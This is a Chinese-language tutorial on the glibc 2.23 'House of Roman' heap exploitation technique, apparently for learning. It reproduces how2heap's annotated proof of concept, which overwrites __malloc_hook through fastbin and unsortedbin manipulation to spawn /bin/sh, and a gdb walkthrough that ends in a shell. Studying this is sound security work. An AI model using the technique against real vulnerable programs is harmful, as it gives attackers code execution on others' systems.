## House of Roman

#### 本节根据how2heap上面同名poc程序进行讲解

### 机制说明
* **本机制充分利用的是堆上的partial overwrite，在只允许修改个别字节的情况下使用**

* **为什么要用partial overwrite？因为libc上面很多我们要利用的符号地址之间偏差基本都在最低两字节，或者最低四字节上，我们其实完全没必要全部修改，只修改低位值即可**

* **本机制要使用unsortedbin+smallbin的一个联合机制**

* **当unsortedbin上面只有一个块时，分配一个较小的块，会将这个块先放入对应的smallbin中，然后再做切割，符合条件的返回，剩余的放回unsortedbin**
1. 从unsortedbin unlink，进入对应smallbin
```c
// glibc-2.23/malloc/malloc.c#L3515
	/* remove from unsorted list */
  unsorted_chunks (av)->bk = bck;
  bck->fd = unsorted_chunks (av);

	if (in_smallbin_range (size))
    {
      victim_index = smallbin_index (size);
      bck = bin_at (av, victim_index);
      fwd = bck->fd;
    }
    // 中间省略largebin的判断处理......
    mark_bin (av, victim_index);
	victim->bk = bck;
	victim->fd = fwd;
	fwd->bk = victim;
	bck->fd = victim;
```

2. 在smallbin进行分割，切割申请的大小返回给用户，剩余放进unsortedbin
```c
// glibc-2.23/malloc/malloc.c#L3718
// 从smallbin里面切割，前半部分是符合条件的，要返回给用户；后半部分剩余返还给unsortedbin
	else
    {
		size = chunksize (victim);

		/*  We know the first chunk in this bin is big enough to use. */
		assert ((unsigned long) (size) >= (unsigned long) (nb));

		remainder_size = size - nb;

		/* unlink */
		unlink (av, victim, bck, fwd);

      	/* Exhaust */
      	if (remainder_size < MINSIZE)
        {
          set_inuse_bit_at_offset (victim, size);
          if (av != &main_arena)
            victim->size |= NON_MAIN_ARENA;
        }

      	/* Split */
      	else
        {
			remainder = chunk_at_offset (victim, nb);

			/* We cannot assume the unsorted list is empty and therefore
			 have to perform a complete insert here.  */
			bck = unsorted_chunks (av);
			fwd = bck->fd;
			if (__glibc_unlikely (fwd->bk != bck))
	        {
	          errstr = "malloc(): corrupted unsorted chunks 2";
	          goto errout;
	        }
			remainder->bk = bck;
			remainder->fd = fwd;
			bck->fd = remainder;
			fwd->bk = remainder;

			/* advertise as last remainder */
			if (in_smallbin_range (nb))
			av->last_remainder = remainder;
			if (!in_smallbin_range (remainder_size))
			{
			  remainder->fd_nextsize = NULL;
			  remainder->bk_nextsize = NULL;
			}
			set_head (victim, nb | PREV_INUSE |
			        (av != &main_arena ? NON_MAIN_ARENA : 0));
			set_head (remainder, remainder_size | PREV_INUSE);
			set_foot (remainder, remainder_size);
        }
		check_malloced_chunk (av, victim, nb);
		void *p = chunk2mem (victim);
		alloc_perturb (p, bytes);
		return p;
    }

```


* **unsortedbin attack利用的就是unlink阶段，`bck->fd=av`这句指令，让目标地址改为了unsortedbin head**
```c
// glibc-2.23/malloc/malloc.c#L3516
	/* remove from unsorted list */
	unsorted_chunks (av)->bk = bck;
	bck->fd = unsorted_chunks (av);
```

* **本机制还需要改变fastbin上面chunk的fd指针**

* **单纯用文字说明太过于无力，下面辅以Poc代码说明**

```c
// how2heap/glibc-2.23/house_of_roman.c
#define _GNU_SOURCE     /* for RTLD_NEXT */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

/* 
Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.

Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman

POC written by Maxwell Dulin (Strikeout) 
*/

// Use this in order to turn off printf buffering (messes with heap alignment)
void* init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}


int main(){
	char* introduction = "\nWelcome to the House of Roman\n\n"
			     "This is a heap exploitation technique that is LEAKLESS.\n"
			     "There are three stages to the attack: \n\n"
			     "1. Point a fastbin chunk to __malloc_hook.\n"
			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
			     "All of the stuff mentioned above is done using two main concepts:\n"
                             "relative overwrites and heap feng shui.\n\n"
			     "However, this technique comes at a cost:\n"
                             "12-bits of entropy need to be brute forced.\n"
			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
			     "**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
	puts(introduction);	
	init(); // 关闭文件流缓存，防止提前分配堆块作为缓存去


	/*	
	Part 1: Fastbin Chunk points to __malloc_hook

	Getting the main_arena in a fastbin chunk ordering is the first step.
	This requires a ton of heap feng shui in order to line this up properly. 
	However, at a glance, it looks like the following:

	First, we need to get a chunk that is in the fastbin with a pointer to
	a heap chunk in the fd. 
	Second, we point this chunk to a pointer to LibC (in another heap chunk). 
	All of the setup below is in order to get the configuration mentioned 
	above setup to perform the relative overwrites. ";


	Getting the pointer to libC can be done in two ways: 
			- A split from a chunk in the small/large/unsorted_bins 
				gets allocated to a size of 0x70. 
			- Overwrite the size of a small/large chunk used previously to 0x71.

	For the sake of example, this uses the first option because it 
	requires less vulnerabilities.	
	*/

	puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
	puts("Setting up chunks for relative overwrites with heap feng shui.\n");

	// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	
	uint8_t* fastbin_victim = malloc(0x60); // 这是后续要修改fd指针指向fake_libc_chunk的fastbin chunk

	// Allocate this in order to have good alignment for relative 
	// offsets later (only want to overwrite a single byte to prevent 
	// 4 bits of brute on the heap).
	malloc(0x80); // 这是一个gap chunk，之后不会用到，但是是为了构造合适的偏移，不能没有

	// Offset 0x100
	uint8_t* main_arena_use = malloc(0x80); // 第一个unsortedbin上利用在这里构造和触发
	
	// Offset 0x190
	// This ptr will be used for a relative offset on the 'main_arena_use' chunk
	uint8_t* relative_offset_heap = malloc(0x60); // 这是用于后续第一个放进fastbin链的chunk，他的地址一定是位于init+0x190的位置，我们可以通过改上面fastbin victim fd的最低1字节，把原本指向这里的链子改到main arena use那里去
	
	// Free the chunk to put it into the unsorted_bin. 
	// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.
	free(main_arena_use); // main_arena_use整体进入unsortedbin
	

	/* 
	Get part of the unsorted_bin chunk (the one that we just freed). 
	We want this chunk because the fd and bk of this chunk will 
	contain main_arena ptrs (used for relative overwrite later).

	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. 

	This has to be the same size because the __malloc_hook fake 
	chunk (used later) uses the fastbin size of 0x7f. There is
	 a security check (within malloc) that the size of the chunk matches the fastbin size.
	*/

	puts("Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n");
//Offset 0x100. Has main_arena + 0x68 in fd and bk.
	uint8_t* fake_libc_chunk = malloc(0x60); // main_arena_use有0x80大小，分配一个0x60大小的chunk，会导致从main arena use上面切割，unsortedbin上面留下一个小块，剩余的块带着未清空的fd bk指针变成fake_libc_chunk

	//// NOTE: This is NOT part of the exploit... \\\
	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8; // malloc hook在该glibc2.23版本下，就是位于0x90的那个smallbin head-0xe8的位置，这是提前用其他方法算好的


	// We need the filler because the overwrite below needs 
	// to have a ptr in the fd slot in order to work. 
	//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. 
	free(relative_offset_heap);	// 释放第一个fastbin chunk,现在fastbin上面是head->relative_heap

    	/* 
    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
	points to is currently at the offset 0x190 (heap_relative_offset).
     	*/
	free(fastbin_victim); // 释放第二个fastbin chunk，现在fastbin上面是 head->fastbin_victim->relative_offset_heap

	/*

	Now, we start doing the relative overwrites, since that we have 
	the pointers in their proper locations. The layout is very important to 
	understand for this.

	Current heap layout: 
	0x0:   fastbin_victim       - size 0x70 
	0x70:  alignment_filler     - size 0x90
	0x100: fake_libc_chunk      - size 0x70
	0x170: leftover_main        - size 0x20
	0x190: relative_offset_heap - size 0x70 

	bin layout: 
			fastbin:  fastbin_victim -> relative_offset_heap
			unsorted: leftover_main
	
	Now, the relative overwriting begins:
	Recall that fastbin_victim points to relative_offset_heap 
	(which is in the 0x100-0x200 offset range). The fastbin uses a singly 
	linked list, with the next chunk in the 'fd' slot.

	By *partially* editing the fastbin_victim's last byte (from 0x90 
	to 0x00) we have moved the fd pointer of fastbin_victim to 
	fake_libc_chunk (at offset 0x100).

	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. 
	Because of this, it has a fd pointer that points to main_arena + 0x68. 

	Now, the fastbin looks like the following: 
	fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).


	The relative overwrites (mentioned above) will be demonstrates step by step below.
	
	*/


	puts("\
Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
to the chunk with the LibC address\n");
	puts("\
Fastbin 0x70 now looks like this:\n\
heap_addr -> heap_addr2 -> LibC_main_arena\n");
	fastbin_victim[0] = 0x00; // The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this. // fastbin_victim的next指针本来指向的是末尾是190的relative_offset_heap,现在通过修改最低一个字节为0，成功改到指向末尾为100的fake_libc_chunk了
	

	/*
	Now, we have a fastbin that looks like the following: 
			0x70: fastbin_victim -> fake_libc_chunk -> (main_arena + 0x68)
	
	We want the fd ptr in fake_libc_chunk to point to something useful. 
	So, let's edit this to point to the location of the __malloc_hook. 
	This way, we can get control of a function ptr.

	To do this, we need a valid malloc size. Within the __memalign_hook 
	is usually an address that usually starts with 0x7f. 
	Because __memalign_hook value is right before this are all 0s, 
	we could use a misaligned chunk to get this to work as a valid size in 
	the 0x70 fastbin.

	This is where the first 4 bits of randomness come into play. 
	The first 12 bits of the LibC address are deterministic for the address. 
	However, the next 4 (for a total of 2 bytes) are not. 
	
	So, we have to brute force 2^4 different possibilities (16) 
	in order to get this in the correct location. This 'location' 
	is different for each version of GLibC (should be noted).

	After doing this relative overwrite, the fastbin looks like the following:
			0x70: fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23).

	*/
	
	/* 
	Relatively overwrite the main_arena pointer to point to a valid 
	chunk close to __malloc_hook.

	///// NOTE: In order to make this exploit consistent 
	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\

	In the actual attack, this values would need to be specific 
	to a version and some of the bits would have to be brute forced 
	(depending on the bits).
	*/ 

puts("\
Use a relative overwrite on the main_arena pointer in the fastbin.\n\
Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
	long long __malloc_hook_adjust = __malloc_hook - 0x23; // We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size. // 计算我们想要构造的fake chunk的地址，至于为什么是__malloc_hook-0x23,首先得在malloc_hook之前，其次malloc hook-0x1b的位置正好有0x70符合fastbin大小，可以通过检查

	// The relative overwrite
	int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	fake_libc_chunk[0] = byte1; // Least significant bytes of the address.
	fake_libc_chunk[1] = byte2; // The upper most 4 bits of this must be brute forced in a real attack. // 改掉fake libc chunk的next指针低位两字节，使其指向malloc hook前的那个地址

	// Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
	// These are fastbin_victim and fake_libc_chunk.
	puts("Get the fake chunk pointing close to __malloc_hook\n");
	puts("\
In a real exploit, this would fail 15/16 times\n\
because of the final half byet of the malloc_hook being random\n");	
	malloc(0x60);
	malloc(0x60);

	// If the 4 bit brute force did not work, this will crash because 
	// of the chunk size not matching the bin for the chunk. 
	// Otherwise, the next step of the attack can begin.
	uint8_t* malloc_hook_chunk = malloc(0x60);	// 分配3次，第一次拿到fastbin_victim，第二次拿到fake libc chunk,第三次拿到__malloc_hook-0x23

	puts("Passed step 1 =)\n\n\n");

	/*
	Part 2: Unsorted_bin attack 

	Now, we have control over the location of the __malloc_hook. 
	However, we do not know the address of LibC still. So, we cannot 
	do much with this attack. In order to pop a shell, we need 
	to get an address at the location of the __malloc_hook.

	We will use the unsorted_bin attack in order to change the value 
	of the __malloc_hook with the address of main_arena + 0x68. 
	For more information on the unsorted_bin attack, review 
	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.

	For a brief overview, the unsorted_bin attack allows us to write
	main_arena + 0x68 to any location by altering the chunk->bk of
	an unsorted_bin chunk. We will choose to write this to the 
	location of __malloc_hook.

	After we overwrite __malloc_hook with the main_arena, we will 
	edit the pointer (with a relative overwrite) to point to a 
	one_gadget for immediate code execution.
			
	Again, this relative overwrite works well but requires an additional 
	1 byte (8 bits) of brute force.
	This brings the chances of a successful attempt up to 12 bits of 
	randomness. This has about a 1/4096 or a 0.0244% chance of working.

	
	The steps for phase two of the attack are explained as we go below.
	*/

	puts("\
Start Step 2: Unsorted_bin attack\n\n\
The unsorted bin attack gives us the ability to write a\n\
large value to ANY location. But, we do not control the value\n\
This value is always main_arena + 0x68. \n\
We point the unsorted_bin attack to __malloc_hook for a \n\
relative overwrite later.\n");


	// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.
	
	uint8_t* unsorted_bin_ptr = malloc(0x80);	// 准备第二次unsortedbin利用
	malloc(0x30); // Don't want to consolidate // 防止与top chunk合并

	puts("Put chunk into unsorted_bin\n");
	// Free the chunk to create the UAF
	free(unsorted_bin_ptr); // 进入unsortedbin

	/* /// NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
	 However, for the sake of example, this has been calculated dynamically. 
	*/
	__malloc_hook_adjust = __malloc_hook - 0x10; // This subtract 0x10 is needed because of the chunk->fd doing the actual overwrite on the unsorted_bin attack.
	byte1 = (__malloc_hook_adjust) & 0xff; 	
	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 


	// Use another relative offset to overwrite the ptr of the chunk->bk pointer.
	// From the previous brute force (4 bits from before) we 
	// know where the location of this is at. It is 5 bytes away from __malloc_hook.
	puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
	unsorted_bin_ptr[8] = byte1; // Byte 0 of bk. 	

	// //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///
	unsorted_bin_ptr[9] = byte2; // Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static. // 把unsorted_bin_ptr的bk指针最低两字节改成__malloc_hook-0x10位置的低位两字节了，这样bk其实就变成__malloc_hook-0x10了
	
	/* 
	Trigger the unsorted bin attack.
	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.

	A few things do happen though: 
		- This makes the unsorted bin (hence, small and large too) 
		   unusable. So, only allocations previously in the fastbin can only be used now.
		- If the same size chunk (the unsorted_bin attack chunk) 
		   is NOT malloc'ed, the program will crash immediately afterwards. 
		   So, the allocation request must be the same as the unsorted_bin chunk.


	The first point is totally fine (in this attack). But, in more complicated 
	programming, this can be an issue.
	The second just requires us to do the same size allocaton as the current chunk.

	*/

	puts("Trigger the unsorted_bin attack\n");
	malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68 // 分配触发unsortedbin上面的unlink过程，bck->fd=av,__malloc_hook=av,malloc hook被改为了unsortedbin的head

	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");

	puts("Passed step 2 =)\n\n\n");
	/* 
	Step 3: Set __malloc_hook to system
	
	The chunk itself is allocated 19 bytes away from __malloc_hook. 
	So, we use a realtive overwrite (again) in order to partially overwrite 
	the main_arena pointer (from unsorted_bin attack) to point to system.

	In a real attack, the first 12 bits are static (per version). 
	But, after that, the next 12 bits must be brute forced. 

	/// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
	*/ 

	puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
	puts("\
Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
we can use a relative overwrite to point this to system or a one_gadget.\n\
Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
comes from.\n");
	malloc_hook_chunk[19] = system_addr & 0xff; // The first 12 bits are static (per version).

	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe. // malloc_hook_chunk拿到时，地址是__malloc_hook-0x13位置，这里也用partial overwrite，把__malloc_hook,准确说现在值是unsortedbin head，的低位4字节改成system的低位4字节，malloc hook又进一步被改成了system


	// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.
	// In a real example, you would probably want to use a one_gadget. 
	// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter
	// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. 
	// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.
	puts("Pop Shell!");
	malloc((long long)shell); // malloc的时候，首先会看__malloc_hook，也就是自定义malloc是否为空。这里被改成了system，那就直接执行system了，然后shell被当成参数传了进去，发现是字符串，直接执行system("/bin/sh")了
		
}
```

* **当前机制力求在最小的手工字节篡改条件下，实现对malloc hook对篡改**


### gdb动态调试过程(直接展示完整调试流程，gdb每次展示的运行过程中间状态就不放出来了，要不然篇幅太长)
```bash
pwndbg> b 120
Breakpoint 2 at 0x55555555528f: file glibc_2.23/house_of_roman.c, line 122.
pwndbg> c
Continuing.

Welcome to the House of Roman

This is a heap exploitation technique that is LEAKLESS.
There are three stages to the attack:

1. Point a fastbin chunk to __malloc_hook.
2. Run the unsorted_bin attack on __malloc_hook.
3. Relative overwrite on main_arena at __malloc_hook.

All of the stuff mentioned above is done using two main concepts:
relative overwrites and heap feng shui.

However, this technique comes at a cost:
12-bits of entropy need to be brute forced.
That means this technique only work 1 out of every 4096 tries or 0.02%.
**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient



Step 1: Point fastbin chunk to __malloc_hook


Setting up chunks for relative overwrites with heap feng shui.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x555555559070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x555555559100
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x555555559190
Size: 0x70 (with flag bits: 0x71)

Top chunk | PREV_INUSE
Addr: 0x555555559200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> n
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x555555559070
Size: 0x90 (with flag bits: 0x91)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555559100
Size: 0x90 (with flag bits: 0x91)
fd: 0x7ffff7bc4b78 拿到unsortedbin head
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x555555559190
Size: 0x70 (with flag bits: 0x70)

Top chunk | PREV_INUSE
Addr: 0x555555559200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> b 140
Breakpoint 3 at 0x5555555552b8: file glibc_2.23/house_of_roman.c, line 143.
pwndbg> c
Continuing.
Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x555555559070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x555555559100 这块是原来main_arena_use在进入smallbin之后分割出来返回给用户的
Size: 0x70 (with flag bits: 0x71)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555559170
Size: 0x20 (with flag bits: 0x21)
fd: 0x7ffff7bc4b78 这块是原来main_arena_use在进入smallbin之后分割出来回到unsortedbin的
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x555555559190
Size: 0x70 (with flag bits: 0x70)

Top chunk | PREV_INUSE
Addr: 0x555555559200
Size: 0x20e00 (with flag bits: 0x20e01)

pwndbg> n
pwndbg> p/x ((long*)fake_libc_chunk)[0] - 0xe8 // 可见返回给用户的这个块fd指针还存着smallbin head的值，可以来算malloc hook的地址
$1 = 0x7ffff7bc4b10
pwndbg> p/x __malloc_hook
$2 = 0x7ffff7bc4b10
pwndbg> x/gx $1
0x7ffff7bc4b10 <__malloc_hook>:	0x0000000000000000

pwndbg> b 157
Breakpoint 4 at 0x5555555552e1: file glibc_2.23/house_of_roman.c, line 195.
pwndbg> c
Continuing.

pwndbg> fastbin
fastbins
0x70: 0x555555559000 —▸ 0x555555559190 ◂— 0

pwndbg> x/4gx 0x555555559000
0x555555559000:	0x0000000000000000	0x0000000000000071
0x555555559010:	0x0000555555559190	0x687420726f46203a // 本来是指向0x0000555555559190

pwndbg> b 202
Breakpoint 5 at 0x555555555306: file glibc_2.23/house_of_roman.c, line 243.
pwndbg> c
Continuing.
Overwrite the first byte of a heap chunk in order to point the fastbin chunk
to the chunk with the LibC address

Fastbin 0x70 now looks like this:
heap_addr -> heap_addr2 -> LibC_main_arena

pwndbg> fastbin
fastbins
0x70: 0x555555559000 —▸ 0x555555559100 —▸ 0x7ffff7bc4bf8 (main_arena+216) ◂— 0x7ffff7bc4bf8 (main_arena+216) 给改成指向0x555555559100了，导致后面全都指错了

pwndbg> b 251
Breakpoint 6 at 0x555555555333: file glibc_2.23/house_of_roman.c, line 251.
pwndbg> c
Continuing.
Use a relative overwrite on the main_arena pointer in the fastbin.
Point this close to __malloc_hook in order to create a fake fastbin chunk

pwndbg> p/x __malloc_hook_adjust
$3 = 0x7ffff7bc4aed
pwndbg> x/gx $3+0x23
0x7ffff7bc4b10 <__malloc_hook>:	0x0000000000000000

pwndbg> b 253
Breakpoint 7 at 0x55555555534b: file glibc_2.23/house_of_roman.c, line 256.
pwndbg> c
Continuing.

pwndbg> x/gx fake_libc_chunk
0x555555559110:	0x00007ffff7bc4aed 更改低字节把fd指向malloc hook-0x23了
pwndbg> x/gx 0x00007ffff7bc4aed+0x23
0x7ffff7bc4b10 <__malloc_hook>:	0x0000000000000000

pwndbg> b 269
Breakpoint 8 at 0x55555555539a: file glibc_2.23/house_of_roman.c, line 301.
pwndbg> c
Continuing.
Get the fake chunk pointing close to __malloc_hook

In a real exploit, this would fail 15/16 times
because of the final half byet of the malloc_hook being random

Passed step 1 =)

pwndbg> x/gx malloc_hook_chunk+0x13
0x7ffff7bc4b10 <__malloc_hook>:	0x0000000000000000 分配到的这个fake chunk+0x13就是malloc hook了

pwndbg> b 314
Breakpoint 9 at 0x5555555553c1: file glibc_2.23/house_of_roman.c, line 315.
pwndbg> c
Continuing.
Start Step 2: Unsorted_bin attack

The unsorted bin attack gives us the ability to write a
large value to ANY location. But, we do not control the value
This value is always main_arena + 0x68.
We point the unsorted_bin attack to __malloc_hook for a
relative overwrite later.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x70 (with flag bits: 0x71)

Allocated chunk | PREV_INUSE
Addr: 0x555555559070
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x555555559100
Size: 0x70 (with flag bits: 0x71)

Free chunk (smallbins) | PREV_INUSE
Addr: 0x555555559170
Size: 0x20 (with flag bits: 0x21)
fd: 0x7ffff7bc4b88
bk: 0x7ffff7bc4b88

Allocated chunk
Addr: 0x555555559190
Size: 0x70 (with flag bits: 0x70)

Allocated chunk | PREV_INUSE
Addr: 0x555555559200
Size: 0x90 (with flag bits: 0x91) 这个就是现在要放进unsortedbin的块

Allocated chunk | PREV_INUSE
Addr: 0x555555559290
Size: 0x40 (with flag bits: 0x41)

Top chunk | PREV_INUSE
Addr: 0x5555555592d0
Size: 0x20d30 (with flag bits: 0x20d31)

pwndbg> b 318
Breakpoint 10 at 0x5555555553dc: file glibc_2.23/house_of_roman.c, line 322.
pwndbg> c
Continuing.
Put chunk into unsorted_bin

pwndbg> unsortedbin
unsortedbin
all: 0x555555559200 —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x555555559200

pwndbg> x/gx &unsorted_bin_ptr[8]
0x555555559218:	0x00007ffff7bc4b78

pwndbg> b 335
Breakpoint 11 at 0x555555555425: file glibc_2.23/house_of_roman.c, line 354.
pwndbg> c
Continuing.
Overwrite last two bytes of the chunk to point to __malloc_hook

pwndbg> x/gx &unsorted_bin_ptr[8]
0x555555559218:	0x00007ffff7bc4b00 已经把他的bk指针指向target-0x10，即malloc_hook-0x10位置了
pwndbg> x/gx 0x00007ffff7bc4b00+0x10
0x7ffff7bc4b10 <__malloc_hook>:	0x0000000000000000

pwndbg> b 360
Breakpoint 12 at 0x555555555467: file glibc_2.23/house_of_roman.c, line 373.
pwndbg> c
Continuing.
Trigger the unsorted_bin attack

Passed step 2 =)

pwndbg> x/gx 0x00007ffff7bc4b00+0x10
0x7ffff7bc4b10 <__malloc_hook>:	0x00007ffff7bc4b78 成功在malloc hook处写入unsortedbin head的值

pwndbg> b 384
Breakpoint 13 at 0x5555555554d2: file glibc_2.23/house_of_roman.c, line 391.
pwndbg> c
Continuing.
Step 3: Set __malloc_hook to system/one_gadget


Now that we have a pointer to LibC inside of __malloc_hook (from step 2),
we can use a relative overwrite to point this to system or a one_gadget.
Note: In a real attack, this would be where the last 8 bits of brute forcing
comes from.

pwndbg> x/gx malloc_hook_chunk+0x13
0x7ffff7bc4b10 <__malloc_hook>:	0x00007ffff78453a0 通过修改低4字节，malloc hook又从head改成system了
pwndbg> p/x system_addr
$4 = 0x7ffff78453a0
pwndbg> x/gx 0x7ffff78453a0
0x7ffff78453a0 <__libc_system>:	0xfa86e90b74ff8548

pwndbg> b 393
Breakpoint 14 at 0x5555555554f5: file glibc_2.23/house_of_roman.c, line 394.
pwndbg> c
Continuing.
Pop Shell!  后续就是成功getshell了
[Attaching after process 38948 fork to child process 39064]
[New inferior 2 (process 39064)]
[Detaching after fork from parent process 38948]
[Inferior 1 (process 38948) detached]
process 39064 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 2: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 3: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 4: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 5: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 6: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 7: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 8: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 9: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 10: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 11: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 12: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 13: No source file named glibc_2.23/house_of_roman.c.
Error in re-setting breakpoint 14: No source file named glibc_2.23/house_of_roman.c.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7fb1740 (LWP 39064) vfork to child process 39065]
[New inferior 3 (process 39065)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 39064 after child exec]
[Inferior 2 (process 39064) detached]
process 39065 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ ls 执行ls指令
[Attaching after Thread 0x7ffff7fb1740 (LWP 39065) vfork to child process 39066]
[New inferior 4 (process 39066)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 39065 after child exec]
[Inferior 3 (process 39065) detached]
process 39066 is executing new program: /usr/bin/ls
warning: could not find '.gnu_debugaltlink' file for /usr/bin/ls
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". 
calc_tcache_idx    first_fit	glibc_2.27  glibc_2.34	glibc_2.38  glibc_2.42		LICENSE		     obsolete
calc_tcache_idx.c  first_fit.c	glibc_2.31  glibc_2.35	glibc_2.39  glibc-all-in-one	Makefile	     README.md
ci		   glibc_2.23	glibc_2.32  glibc_2.36	glibc_2.40  glibc_ChangeLog.md	malloc_playground
Dockerfile	   glibc_2.24	glibc_2.33  glibc_2.37	glibc_2.41  glibc_run.sh	malloc_playground.c 结果就在这体现了
$ [Inferior 4 (process 39066) exited normally]

```

* **和House of Orange一样，House of Roman执行成功也是随机事件。**
**如果恰好出现当前地址无法通过只修改低几位来完成，那就会导致崩溃**
